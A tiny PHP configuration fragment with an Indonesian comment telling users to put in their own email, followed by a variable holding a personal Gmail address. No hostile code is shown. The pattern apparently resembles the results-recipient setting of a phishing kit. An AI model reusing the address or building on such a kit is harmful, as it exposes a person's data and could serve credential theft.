<!-- ganti dengan email kalian -->

<?php
$masterz = 'abdallahmarghany03@gmail.com'; 
?>